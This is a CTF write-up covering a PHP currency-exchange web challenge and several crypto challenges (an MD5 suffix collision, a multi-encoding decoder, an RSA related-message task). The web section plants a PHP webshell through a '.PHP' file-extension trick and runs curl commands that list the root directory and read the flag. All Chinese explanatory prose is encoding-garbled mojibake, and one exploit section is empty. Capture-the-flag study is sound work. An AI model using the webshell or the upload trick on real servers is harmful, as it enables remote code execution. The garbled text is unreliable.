        "Vatican City" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Venezuela" => array("ISO" => "VES", "toTWD" => 0.87),
        "Vietnam" => array("ISO" => "VND", "toTWD" => 0.87),
        "Wallis and Futuna" => array("ISO" => "XPF", "toTWD" => 0.87),
        "Yemen" => array("ISO" => "YER", "toTWD" => 0.87),
        "Zambia" => array("ISO" => "ZMW", "toTWD" => 0.87),
        "Zimbabwe" => array("ISO" => "none", "toTWD" => 0.87),
    );
    ```
    :::
* index.php
    :::spoiler Source Code
    ```php=
    <?php
    error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE);
    include("currency.php");

    $resultLink = "";

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $region = $_POST["region"];
        $amount = $_POST["amount"];

        $isoName = $countryData[$region]["ISO"];
        $rate = $countryData[$region]["toTWD"];

        $convertedAmount = $amount * $rate ?: $amount;

        $htmlContent = "<html><body>";
        $htmlContent .= "<h1> Exchange result </h1>";
        $htmlContent .= "<p>{$amount} TWD = {$convertedAmount} {$isoName}</p>";
        $htmlContent .= "<a href='/'>Back to Home</a></body></html>";

        $filePath = "upload/" . md5(uniqid()) . "." . $isoName;
        file_put_contents($filePath, $htmlContent);

        $resultLink = "<a href='" . $filePath . "'> ğŸ‘ï¸ exchange result</a>";
    }
    ?>

    <!DOCTYPE html>
    <html>
    <head>
        <title>ğŸª™Exchange Station</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocas/4.2.5/tocas.min.css" />
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocas/4.2.5/tocas.min.js"></script>

        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700&display=swap" rel="stylesheet" />

    </head>
    <body>
        <div class="ts-segment">
            <div class="ts-app-navbar is-fluid">
                <a class="item">
                    <div class="ts-icon is-house-icon"></div>
                    <div class="label">Home</div>
                </a>
            </div>
        </div>
        <br>
        <br>
        <div class="ts-container is-very-narrow">
        <fieldset class="ts-fieldset">
        <legend>ğŸª™Exchange Station</legend>
            <form action="" method="post">
                <label for="region">ğŸŒRegion</label>
                <div class="ts-select">
                    <select name="region" id="region">
                        <?php foreach ($countryData as $region => $data): ?>
                            <option value="<?php echo $region; ?>"><?php echo $region; ?></option>
                        <?php endforeach; ?>
                    </select>
                </div>
                <br>
                <br>
                <div class="ts-input is-labeled">
                    <span class="label">ğŸ’µAmount </span>
                    <input type="text" id="amount" name="amount" required>
                    <span class="label">TWD</span>
                </div>
                <br>
                <button class="ts-button">Submit</button>
            </form>
            <?php
            if ($resultLink) {
                echo $resultLink;
            }
            ?>
            </fieldset>
        </div>
    </body>
    </html>
    ```
    :::

#### Recon
é€™ä¸€é¡Œæ˜¯è³½å¾Œè§£ï¼Œæ‰€ä»¥åƒè€ƒäº†å®˜è§£ï¼Œå…¶å¯¦æˆ‘å¿«è¦æ¥è¿‘ç­”æ¡ˆäº†ï¼Œæ€è€ƒçš„é‚è¼¯ä¹Ÿæ²’æœ‰éŒ¯ï¼Œåªæ˜¯çœŸçš„ä¸å¤ ç´°å¿ƒï¼Œæ²’æœ‰è§€å¯Ÿåˆ°å°å·§æ€
1. å…ˆè§€å¯Ÿdockerfileï¼Œå¯ä»¥ç™¼ç¾æˆ‘å€‘è¦æ‰¾çš„flagå°±æ˜¯åœ¨æ ¹ç›®éŒ„ï¼Œæ‰€ä»¥æ²’æ„å¤–æ‡‰è©²æ˜¯è¦æ‹¿åˆ°shell
2. å†çœ‹é€™éš»ç¨‹å¼åœ¨å¹¹éº»
    é€™å€‹ç¶²ç«™å°±åªæœ‰è½‰æ›åŒ¯ç‡çš„åŠŸèƒ½ï¼Œè½‰æ›åŒ¯ç‡çš„tableå°±æ”¾åœ¨currency.phpï¼Œé¦–å…ˆå‰ç«¯å¯é¸æ“‡è¦è½‰æ›çš„åœ‹å®¶å¹£å€¼ï¼Œç„¶å¾Œå¡«å…¥æ•¸å­—ä»–å°±æœƒæŠŠé€™å…©å€‹parameterså­˜æˆä¸€å€‹æª”æ¡ˆï¼Œæ¥è‘—æˆ‘å€‘å°±å¯queryä»–
3. å‡ºç¾å•é¡Œçš„code
    ```php=
    <?php
    error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE);
    include("currency.php");

    $resultLink = "";

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $region = $_POST["region"];
        $amount = $_POST["amount"];

        $isoName = $countryData[$region]["ISO"];
        $rate = $countryData[$region]["toTWD"];

        $convertedAmount = $amount * $rate ?: $amount;

        $htmlContent = "<html><body>";
        $htmlContent .= "<h1> Exchange result </h1>";
        $htmlContent .= "<p>{$amount} TWD = {$convertedAmount} {$isoName}</p>";
        $htmlContent .= "<a href='/'>Back to Home</a></body></html>";

        $filePath = "upload/" . md5(uniqid()) . "." . $isoName;
        file_put_contents($filePath, $htmlContent);

        $resultLink = "<a href='" . $filePath . "'> ğŸ‘ï¸ exchange result</a>";
    }
    ?>
    ```
    å‰ä¸€æ®µæ‰€èªªçš„åŠŸèƒ½å°±æ˜¯é€™ä¸€æ®µåœ¨åšçš„äº‹æƒ…ï¼Œè€Œå¾dockerå¾Œå°ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€æ¨£çš„ç‹€æ³
    ![image](https://hackmd.io/_uploads/Hy9HFqgop.png)
    åœ¨dockerä¸­çš„/upload/å°±æœƒå­˜æˆé€™æ¨£çš„å…§å®¹
    ![image](https://hackmd.io/_uploads/S1MOY9esa.png)
    æ‰€ä»¥æ˜¯ä¸æ˜¯æˆ‘å€‘å¯ä»¥å¡«å…¥æœ€åŸºæœ¬çš„webshellå¾Œï¼Œç•¶æˆ‘å€‘queryé€™å€‹fileæ™‚å°±è‡ªå‹•è·‘èµ·ä¾†
4. é­é‡çš„å›°é›£
    å¦‚æœåªæ˜¯åˆ©ç”¨å‰›å‰›çš„ç‹€æ…‹ç›´æ¥å¯«`<?php system($_GET['sh']); ?>`ï¼Œæœƒä¸æˆåŠŸï¼ŒåŸå› æ˜¯é›–ç„¶å¾Œç«¯é‚„æ˜¯å„²å­˜æˆä¸€å€‹çœ‹èµ·ä¾†åƒwebshellçš„å…§å®¹ä½†æ˜¯ï¼Œé€åˆ°å‰ç«¯è¢«renderå¾Œæœƒè¢«ç•¶ä½œä¸€èˆ¬çš„commentï¼Œé€™ä¹Ÿæ˜¯æˆ‘ä¸€é–‹å§‹å¡çš„åœ°æ–¹
    ![image](https://hackmd.io/_uploads/rkqK9cesT.png)
5. How to solve?
    å¯ä»¥è§€å¯Ÿå‰é¢çš„dockerfileï¼Œå€’æ•¸ç¬¬äºŒè¡Œçš„
    > AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP
    æ ¹æ“šchatgpt:
    > åœ¨Apacheçš„é…ç½®æ–‡ä»¶ `/etc/apache2/apache2.conf` ä¸­æ·»åŠ  `AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP` çš„æ„æ€æ˜¯å‘Šè¨´Apacheæœå‹™å™¨å°‡ä»¥ `.php`, `.Php`, `.pHp`, `.phP`, `.pHP`, `.PHp`, `.PHP` çµå°¾çš„æ–‡ä»¶è¦–ç‚ºPHPè…³æœ¬æ–‡ä»¶é€²è¡Œè§£æå’ŒåŸ·è¡Œã€‚é€™æ¨£åšå¯ä»¥ç¢ºä¿Apacheåœ¨æ”¶åˆ°é€™äº›æ–‡ä»¶è«‹æ±‚æ™‚ï¼Œå°‡å®ƒå€‘äº¤çµ¦PHPè§£é‡‹å™¨è™•ç†ï¼Œè€Œä¸æ˜¯ç°¡å–®åœ°å°‡å®ƒå€‘ä½œç‚ºéœæ…‹æ–‡ä»¶ç™¼é€çµ¦å®¢æˆ¶ç«¯ã€‚

    (ä¹Ÿå°±æ˜¯èªªå¦‚æœä½œè€…æ²’æœ‰åŠ ä¸Šé€™ä¸€æ®µçš„è©±å°±ä¸ç”¨ç©äº†ï¼Œæ‡‰è©²ã„…...)

    æ‰€ä»¥æˆ‘å€‘è¦åšçš„å°±å¾ˆç°¡å–®äº†,çœ‹å“ªä¸€å€‹åœ‹å®¶çš„ç¸®å¯«æ˜¯phpç›¸é—œçš„ï¼Œåªè¦é¸å–è©²åœ‹å®¶ï¼Œå¾Œç«¯å°±æœƒæŠŠæª”æ¡ˆå–åæˆ`.PHP`ï¼Œç¿»äº†ä¸€ä¸‹currency.phpç™¼ç¾æ˜¯==è²å¾‹è³“==ï¼Œæ‰€ä»¥åªè¦é¸å–è²å¾‹è³“ï¼Œä¸¦ä¸”ç”¨æœ€ç°¡å–®çš„php websehllå°±å¯ä»¥é”åˆ°RCE
    ![image](https://hackmd.io/_uploads/SkOzHCeia.png)
6. æˆåŠŸRCE
    Payload: 
    ```url
    http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=ls
    ```
    ![image](https://hackmd.io/_uploads/B1RBr0ljp.png)

#### Exploit - Upload Webshell
Payload: 
```bash
$ curl "http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=ls%20/"
<html><body><h1> Exchange result </h1><p>bin
boot
dev
etc
flag-lMXptmyC
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ curl "http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=cat%20/flag-lMXptmyC"
<html><body><h1> Exchange result </h1><p>TSCCTF{FAKEFLAG}
 TWD = TSCCTF{FAKEFLAG}
 PHP</p><a href='/'>Back to Home</a></body></html>%
```

## Crypto

### CCcollision

#### Source Code
:::spoiler
```python=
from hashlib import md5
from string import ascii_lowercase, digits
from random import choice
from secret import FLAG

def get_random_string(length):
    return "".join([choice(ascii_lowercase + digits) for _ in range(length)])

prefix = get_random_string(5)
hashed = md5(get_random_string(30).encode()).hexdigest()

print("here is your prefix: " + prefix)
print("your hash result must end with: " + hashed[-6:])

user_input = input("Enter the string that you want to hash: ")
user_hash = md5(user_input.encode()).hexdigest()

if user_input[:5] == prefix and user_hash[-6:] == hashed[-6:]:
    print(FLAG)
```
:::

#### Exploit
å°±æ˜¯ä¸€èˆ¬å¸¸è¦‹çš„powè¦ç®—çš„collision

```pyton=
from pwn import *
from hashlib import md5
import os
from string import ascii_lowercase, digits
from random import choice

r = remote('172.31.200.2', 40004)

def get_random_string(length):
    return "".join([choice(ascii_lowercase + digits) for _ in range(length)])

print(r.recvuntil(b'here is your prefix: '))
prefix = r.recvline()[:-1]
print(r.recvuntil(b'your hash result must end with: '))
ended = r.recvline()[:-1].decode()

log.info(f"{prefix=}\n{ended=}")

while True:
    ans = prefix + get_random_string(8).encode()
    user_hash = md5(ans).hexdigest()
    # print(user_hash)
    if ans[:5] == prefix and user_hash[-6:] == ended[-6:]:
        log.success("Find Collision~~~")
        r.sendlineafter(b'Enter the string that you want to hash: ', ans)
        break
print(r.recvline())
r.interactive()
```

Flag: `TSC{2a92efd3d9886caa0bc437f236b5b695c54f43dc9bdb7eec0a9af88f1d1e0bee}`

### Encoded not Encrypted

#### Source Code
:::spoiler
```python=
from random import choice, randint
from string import ascii_uppercase
from secret import FLAG

words = open("./Crypto/Encode not Encrypt/fasttrack.txt").read().splitlines()
selected = [choice(words) for _ in range(100)]
assert all(word in words for word in selected)
ans = " ".join(selected)

def a(s):
    return "".join(hex(ord(c))[2:] for c in s)

b_chars = 'zyxwvutsrqponmlkjihgfedcba'
def b(s):
    result = ""
    for c in s:
        binary = f'{ord(c):08b}'
        front, back = binary[:4], binary[4:]
        result += b_chars[int(front, 2)] + b_chars[int(back, 2)]
    return result

c_chars = '?#%='
def c(s):
    result = ""
    for c in s:
        binary = f'{ord(c):08b}'
        for i in range(0, 8, 2):
            result += c_chars[int(binary[i:i+2], 2)]
    return result

def d(s):
    return "".join(oct(ord(c))[2:] for c in s)

func = {0: a, 1: b, 2: c, 3: d}
encodeds = []
hint = ""
for word in selected:
    num = randint(0, 3)
    encodeds.append(func[num](word))
    for bit in f'{num:02b}':
        ch = choice(ascii_uppercase)
        hint += ch if bit == '1' else ch.lower()

print(selected)
print(" ".join(encodeds))
print(hint)

user_input = input("Enter the answer: ")
if user_input == ans:
    print(FLAG)

```
:::

#### Exploit
é€™ä¸€é¡Œä½œè€…æœ‰æ”¾æ°´ï¼Œå› ç‚ºå…¶å¯¦åœ¨è½‰æ›å…«é€²åˆ¶çš„åœ°æ–¹å¯ä»¥å¾ˆé›£ï¼Œæ’‡é™¤æ‰é€™å€‹éƒ¨åˆ†å…¶å¯¦ç”¨chatGPTå¹«å¿™ç”Ÿä¸€ä¸‹codeå†local debugä¸€ä¸‹ï¼Œæ‡‰è©²ä¸ç”¨åŠå°æ™‚ï¼Œsource codeä¸­ç°¡å–®çš„æµç¨‹å°±æ˜¯ï¼Œä»–æœƒå¾wordlistä¸­æŠ½é¸100å€‹wordsï¼Œç„¶å¾Œéš¨æ©Ÿçµ¦ä¸åŒçš„encodeæ–¹å¼ï¼ŒåŒ…å«
1. è½‰æ›æˆhex 
2. 2. ä¾ç…§å­—å…ƒçš„low / high bytesåšåˆ°scramble 
3. 3. å’Œä¸Šä¸€å€‹å¤§åŒå°ç•°ï¼Œä¾ç…§æ¯å…©å€‹bitsåšåˆ°scramble 
4. 4. è½‰æ›æˆå…«é€²åˆ¶

ä½œè€…æœ‰çµ¦hintï¼Œæˆ‘å€‘å¯ä»¥æ ¹æ“šhintçŸ¥é“ä»–æ˜¯ç”¨å“ªä¸€å€‹æ–¹å¼encodeï¼Œè€Œæœ€é›£çš„åœ°æ–¹æ˜¯å…«é€²åˆ¶ï¼Œå› ç‚ºä¸åŒçš„printable charæœƒæ±ºå®šè½‰æ›å¾Œæ˜¯ä¸‰å€‹charé‚„æ˜¯å…©å€‹charï¼Œå‡è¨­åŸæœ¬çš„plaintextæ˜¯==Summer2011==ï¼Œé€™ç¨®åŒæ™‚åŒ…å«æ•¸å­—å’Œè‹±æ–‡ï¼Œencodeå®Œæœƒè®Šæˆ==12316515515514516262606161==ï¼Œä½†æ˜¯å…¶ä¸­è‹±æ–‡çš„éƒ¨åˆ†ä»–æ˜¯æ¯ä¸‰å€‹stringæ§‹æˆï¼Œè€Œæ•¸å­—çš„éƒ¨åˆ†å°±æ˜¯æ¯å…©å€‹stringæ§‹æˆï¼Œå¦‚æœåªæ˜¯çŸ¥é“ä»–ç”¨å…«é€²åˆ¶çš„æ–¹å¼encodeï¼Œæ‡‰è©²æ²’æœ‰è¾¦æ³•è§£æ±ºé€™æ¨£çš„ç‹€æ³ï¼Œç›®å‰ä¹Ÿé‚„æ²’æƒ³åˆ°ç›¸å°æ‡‰çš„è§£æ³•
```python=
from pwn import *
import string

r = remote('172.31.200.2', 42816)

encoded = r.recvline()[:-1].decode().split(' ')
hint = r.recvline()[:-1].decode()
# encoded = "vysusvsutmtlwxwzwyws #%#?#%?##=#?#%?##%?%#%?##=?=#%## #=?=#=??#=?%#%%##%=%#%#=?=?%?=???=?#?=?= ?=?#?=?#?=?#?=?#?=?#?=?# #=?=#%?##=?=#%?# swtusxsttusx tntusvtmtutqtl 146151162145 70617373 tytvtmtqtltqswsvtysvtksx 141144155151156163 77696e74657232303132 swtutwsxtusv 6d6f6e6b6579 70726976617465 163145162166145162 12316515515514516262606165 ustutntwtktmtuwywxww swsutmtmtusxwxwzwzwr ustqtlsvtusxwxwzwywu swtutwsusxtqsvsq swtltkss 57656c636f6d6531323132 swsutmtmtusxwxwzwzwr #=?=#%###%?=#=?%#%###=#??%?# 163161154 uzvzwuwusswzsxtvxy 146151162145 61646d696e61646d696e ##??#????=##?=###=#=?=??#=?%#%#??%?# 53756d6d657232303131 74657374 #=#?#%###=?=#=#??%=##=?=#=?##%=??=?= 7374617277617273 73716c70617373 ##?=#=###%=##%=##%###=?%?=?%?=???=?#?=?= 61646d696e69737461746f72 #%#=#%==#%?##=#? #%#?#=?%#%?##%#=#%==#%=% swsutmtmtusxwxwzwywz tysusvsutmtlwxwzwywu ###=#%%##%=%#=#?#%###=?%?=?%?=???=?#?=#% sutltotltksstl 163157155145144141171 155157156153145171 #%?=#%==#%=##=??#%?##%=%#=%#?=?#?%?# #=?##=#=#%###=?%#=#?#=%# 313233343536 syty 6561727468 svtuswsvxmswsytnww twtrtytltstu 163145143162145164616263 #=?=#=###%=##%=##%###=?%?=?%?=???=?#?=?= 6e6574776f726b73 504073737730726421 141144155151156163 123161154163145162166145162 #=?=#=###%=##%=##%###=?%?=?%?=???=?#?=## uzvzswswsswzsxtvxy 144162141147157156 uwsutmtmtusxwxwzwyws 6d6f6e6b6579 ##??#???#=?=#=?=#=#=#%==#=?%#%#??%?# 504035357730726421 #=#?#%###=?=#=#??%=##=?=#=?##%=??=?= 163145143162145164616263 646576646576 73656372657421 twtktmsztytlsqwyxy 57696e74657232303133 ustqtlsvtusxwxwzwywy wqwu 6368616e6765 143157155160141156171616263 146151162145 163157155145144141171 tltusvsstksxtotqtlts swsytnswtusxsttusxwxwzwzwu 7365637265743121 170160 537072696e6732303134 6e6574776f726b696e67 #%=%#=#? 141144155151156 7870 70617373776f7264313233 #%?%#%%##=?%#%#? 12010065651676016214441 16316115462606071 #=?=#%###%?=#=###=?%#%%##=#?#=%# ?=%#?=## #=?=#=%##=?=#%?##%#?#%=##%%##%=% #=#?#%###=?=#=#?#=#?#%###=?=#=#? 74657374696e67313233 #%?##%#?#%=##%%##%=% 737072696e6732303137 143150141156147145 12316515515514516262606161 tysusvsutmtlwxwzwyws".split(' ')
# hint = 'rETwKtXdNrgIdKGNvhuXWXqtkOpcfzTEKKvQcNzIsPxLgyvQMxOWnDZOunIyujxcNnbsvbOqwoYmUtlWlBUfyGDLXIOoVcyqyMkcjQbKBNUtabauLFHZLqaNOSvVvrFhbkWdHWsdrjkAcxvViRfkGGLTTFkShPujVXgunhBmPCvmugHeTVDXKhVwHvPuftKdmlZJIBrI'
ascii_lower = string.ascii_lowercase
ascii_higher = string.ascii_uppercase

def dec_a(s):
    return bytes.fromhex(s).decode('utf-8')

b_chars = 'zyxwvutsrqponmlkjihgfedcba'
def dec_b(s):
    res = ''
    for i in range(0, len(s), 2):
        front = b_chars.find(s[i])
        back = b_chars.find(s[i+1])
        bin = f'{front:04b}' + f'{back:04b}'
        res += chr(int(bin, 2))
    return res

c_chars = '?#%='
def dec_c(s):
    result = ""
    for i in range(0, len(s), 4):
        binary_chunk = ""
        for j in range(4):
            binary_chunk += f'{c_chars.index(s[i + j]):02b}'
        result += chr(int(binary_chunk, 2))
    return result
    
# def dec_d(s):
#     s = [s[i:i+2] for i in range(0, len(s), 2)]
#     return "".join(chr(int(i, 8)) for i in s)

def decode_octal(encoded_str):
    octal_chunks = [encoded_str[i:i+3] for i in range(0, len(encoded_str), 3)]
    decoded_str = "".join(chr(int(chunk, 8)) for chunk in octal_chunks)
    return decoded_str

answer = b""
for i in range(len(encoded)):
    if hint[i*2] in ascii_lower and hint[i*2+1] in ascii_lower:
        answer += dec_a(encoded[i]).encode() + b' '
    elif hint[i*2] in ascii_lower and hint[i*2+1] in ascii_higher:
        answer += dec_b(encoded[i]).encode() + b' '
    elif hint[i*2] in ascii_higher and hint[i*2+1] in ascii_lower:
        answer += dec_c(encoded[i]).encode() + b' '
    elif hint[i*2] in ascii_higher and hint[i*2+1] in ascii_higher:
        answer += decode_octal(encoded[i]).encode() + b' '

print(answer)
r.sendlineafter(b'Enter the answer: ', answer[:-1])
r.interactive()
```

### Baby staRburSt streAm

#### Source Code
:::spoiler
```python=
print(
"""
      />_________________________________
[########[]_________________________________>
      \>                Sword Art Offline
    
"""
)

from Crypto.Util.number import *
from random import random
from time import sleep
from secret import FLAG

flag = bytes_to_long(FLAG)
p = getPrime(1024)
q = getPrime(1024)
n = p * q
print(f'{n = }')

assert 2*n > flag > 0

def starburst(x: int):
    return (x * 0x48763 + 0x74) % n


def isBurst() -> bool:
    return True


sleep(10)

for i in range(16):
    flag = starburst(starburst(flag))
    if isBurst():
        print(pow(flag, 0x487, n))
```
:::

#### Recon
é€™ä¸€é¡Œæ˜¯è³½å¾Œè§£ï¼Œä¹Ÿæ˜¯çœ‹äº†@ywcå¤§[^ywc]çš„WPï¼Œå…¶å¯¦å¾ˆç°¡å–®ï¼Œå°±æ˜¯ä¸€å€‹ç°¡å–®çš„[Related Message Attack](https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack)ï¼Œé¡Œç›®ç”šè‡³ä¹Ÿæ²’ä»€éº¼è®Šï¼Œ

#### Exploit

## Reference
[^ywc]:[ywcå¤§å¤§çš„WP](https://hackmd.io/@ywChen/ryxg6zhFT#Babypwn2024-Nerf)